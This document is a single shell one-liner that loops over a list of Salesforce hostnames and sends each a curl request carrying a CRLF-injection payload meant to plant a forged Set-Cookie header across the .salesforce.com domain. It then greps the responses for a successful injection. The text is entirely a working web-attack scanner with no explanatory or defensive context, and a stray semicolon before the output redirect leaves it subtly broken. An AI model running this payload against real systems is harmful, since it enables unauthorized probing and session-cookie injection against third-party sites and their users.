--cut-here
while read -r line;do curl -s -I "https://$line/%0DSet-Cookie:crlf=injection;domain=.salesforce.com;" | grep '^Set-Cookie' | grep 'injection'; >> request.out;done < salesforce.list
--cut-here
 
